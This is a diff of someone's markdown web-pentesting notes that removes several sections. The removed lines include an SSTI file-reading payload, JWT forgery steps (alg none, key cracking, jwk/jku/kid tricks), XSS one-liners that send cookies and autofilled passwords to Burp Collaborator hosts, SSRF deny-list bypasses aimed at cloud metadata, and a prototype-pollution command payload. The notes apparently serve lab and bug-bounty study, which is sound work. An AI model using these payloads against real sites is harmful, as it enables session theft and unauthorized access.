@@ -70,8 +70,6 @@ Helpful resources
  - Possibilites: Password reset poisioning, web cache poisioning, host header auth bypass, Routing based SSRF, SSRF via via flawed request parsing, via malformed request line
 
 
-### SSRF
- - check if any url is being added in body values or url parameters
  
 ### Directory Traversal
  - check where path is being loaded, including <img> tags
@@ -92,17 +90,7 @@ Helpful resources
  - Can TLS be broken?
  - Can intranet be accessed?
 
-### Server Side Template Injection
- - See where user supplied data is being reflected
- - Send fuzzing data usually {{<%[%'"}}%\]>}} or use the payload listed belows, use ffuf maybe?,but if response appears in another page, no use, only if same place resposne appears then ffuf can be of use
- - If found, read about template engine/secuirty implication sections
- - get idea of different objects and functions
- - Some templates and their SSTI: https://github.com/GoSecure/template-injection-workshop
- - Pentest Sheet: https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
- - Dgango specific: https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf
- - Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
- - good lab: https://gosecure.github.io/template-injection-workshop/#7
- - object chaining: ${ product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ") }
+
 
 ### SQL
  - UNION BASED
@@ -118,112 +106,10 @@ Helpful resources
 
 https://github.com/bugcrowd/bugcrowd_university
 
-### JWT 
-				    https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/
- - Change claims, signature might not verified so u can access easily
- - change claims, change alg to none, remove signature except trailing dot, weak verification
- - Brute force signing key. `hashcat -a 0 -m 16500 <jwt> <wordlist>`. Wordlist https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list.  if it is cracked token:<key>. base64encode that key. in jwt edit, new symmetric key, generate, replace `k` with base64 encoded key, go back to repeater and sign
- - only "alg" key is compulsory, rest is optional. Devs use "jwk" ->  - Provides an embedded JSON object representing the key. 
-	```json
-	{
-    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
-    "typ": "JWT",
-    "alg": "RS256",
-    "jwk": {
-        "kty": "RSA",
-        "e": "AQAB",
-        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
-        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
-    }
-}
-	```
-	Devs should whitelist keys to verify in the backend, if they just use the key in the jwk, then attacker could insert their own key.
-	Steps:
-		
-
-   	 With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
-
-   	 Generate a new RSA key.
-
-    	Send a request containing a JWT to Burp Repeater.
-
-    	In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.
-
-    	Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.
-
-   	 Send the request to test how the server responds.
 
 
- - "jku", points to our custom exploit server, use the jwt editor burp plugin, generate, copy and paste to custom exploit server,
-```json
-{
-    "keys":[
-{
-    "kty": "RSA",
-    "e": "AQAB",
-    "kid": "d3818709-acea-4457-8946-58a9ac958d8b",
-    "n": "hzcJ00KMoO6V1hN7MiwBuHVujFV4EmWnEs6SRSgVw0SQM60iV3HmJbbF69dC5hadgoN19QSa12ZCB41Jq7PGfx8cI1RE2WPiy7id8nFfmzKVuEtAVK-lDGfx89YWPOCRl1R7MTrU6lLO9zPbP2FWLpbNm0Ooj602JMgWEIWPz43llz4xgJOmYX8EQia9ntKeOs9-2vjL6OVWjdyR3i8JD0jiFvpQ8iY-ufEdVaRuBjaoeH5N_-dF3SNh7ccK5yoRvWAW9K2NKCrjpyL1wRql775Xdk93zBh9LVj4UBaAPo-NOv06hm1ixia-DI_h9V1Ef4wEbmXhO4ws1X1ahZb-kw"
-}
-    ]
-}	
-```
-  when signing make sure "type":"jwt" is added, and remove "kid."
- - Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a kid (Key ID) parameter, which helps the server identify which key to use when verifying the signature. 
-	```json
-	{
-    "kid": "../../path/to/file",
-    "typ": "JWT",
-    "alg": "HS256",
-    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
-}
-	```
-	Generate to generate a new key in JWK format. Replace the generated value for the k property with a Base64-encoded null byte (AA==).  ../../../../../../../dev/null .
- - make “alg”: “none”, make changes, and then Use an empty signature (i.e. signature = “”), has to have trailing dot.
- - https://pentestbook.six2dez.com/enumeration/webservices/jwt
- - https://kleiton0x00.github.io/posts/json-web-token-exploitation/
- - https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- - https://github.com/sergioms/PentestJWT
- - https://medium.com/@netscylla/json-web-token-pentesting-890bc2cf0dcd
- - https://materials.rangeforce.com/tutorial/2019/05/29/Breaking-JWTs/
-### XSS payload
- - steal cookies<script>
-fetch("https://28871y2murqilrzo0kexuhsd74du1j.burpcollaborator.net",{
-method:"POST","mode": "no-cors", body:document.cookie,
-})
-</script>
- - steal password autofill <input name=user id=user>
-<input name=pass id=pass 
-onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.burpcollaborator.net', {method: 'POST', mode:'no-cors',body: user.value+' '+this.value}),">
 
 
-### SSRF
- - places to look for
-   - When a full URL is used in a parameter in the address bar:
-   - A partial URL such as just the hostname: like http://test?s=api
-   - Or perhaps only the path of the URL: like http://test?s=/form/
-   Deny List
- - Use free website to test if connection is being done `https://webhook.site/`
- - In band SSRF, content is given back to the user
- - http://pingb.in/ , https://requestbin.com/ , https://canarytokens.org/ 
- - Possible things to look at ```Include full URLs in the POST body or parameters
-Include URL paths (or partial URLs) in the POST body or parameters
-Headers that include URLs like Referer
-Allows for user input that may result in a server retrieving resources```
-
-	A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
-
-
-Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.
-
-
-Allow List
-
-An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.
-
-
-Open Redirect
-
-If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
 
 ### Open Redirection
   - DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation.
@@ -234,60 +120,8 @@ If the above bypasses do not work, there is one more trick up the attacker's sle
   - *Broken Function Level authorization*, api endpoint /api/user/453, user id Change may get access, or access for another method ?
   - *Execissive data exposure*, EX: if password reset api, gives the link directly as response as well, or something similar
   - *Mass assignment* extra properties in JSON object passed. Ex: in forgot password {username:asd,password:"asd",isAdmin:false}, could change isAdmin to true
-### protype pollution
- - if `__proto__` is filetered, we can use constructor
-```
-
-{
-
-"constructor":{
-
-"prototype":{
-
-	"execPath":"cat", "execArgv":[
-
-"flag_iMctq"
-
-]
-
-}}
-
-}```
- - Reading the docs tells us that the fork function accepts an execPath and execArgv arguments.
- - To be honest I still do not understand it completely. https://y3a.github.io/2021/06/15/htb-breaking-grad/ 
+ 
 	
-### graphql
-  - no need to send multiple requests, one will work
-  - query = is for querying, mutation = is for writing, subscriptio = is to get notification
-  - get all possible field names (intropection) {__schema{types{name,fields{name}}}}
-  - To get what query that can be performend, and arguements type query {
-  __schema {
-    queryType {
-      fields {
-        name
-        args {
-          name
-        }
-      }
-    }
-  }
-}
-  - Check if any unauthorized access can be done (Authorization bypass)
-  - Exessive data exposure, information disclosure
-  - 
-  - Ex: Once u get schema in insomnia, (may need to add auth manually, not just header), show doc, 
-  - https://konghq.com/blog/insomnia-graphql/
-  - https://graphql.org/learn/introspection/
-  - https://docs.insomnia.rest/insomnia/graphql-queries
-  - https://konghq.com/blog/insomnia-graphql/
-  -https://book.hacktricks.xyz/pentesting/pentesting-web/graphql#query-__schema-types-name-fields-name
-  - https://prog.world/pentest-applications-with-graphql/
-
-tomorrow on insomnia, try this
-{"query":"query {\n          organization {\n            id\n            type\n            legacyType\n            flag {\n              client\n              vendor\n              agency\n              individual\n            }\n          }\n          companySelector {\n            items {\n              organizationId\n              organizationRid\n              organizationEnterpriseType\n              organizationType\n              organizationLegacyType\n              typeTitle\n              title\n              photoUrl\n            }\n          }\n        }"}
-
-pes[Cf!Cal
-
 ## Mass assignment
  - Mass assignment reflects a scenario where client-side data is automatically bound with server-side objects or class variables. However, hackers exploit the feature by first understanding the application's business logic and sending specially crafted data to the server, acquiring administrative access or inserting tampered data. This functionality is widely exploited in the latest frameworks like Laravel, Code Ignitor etc.
  - like when creating user, `credit` column, u can actually add the value.
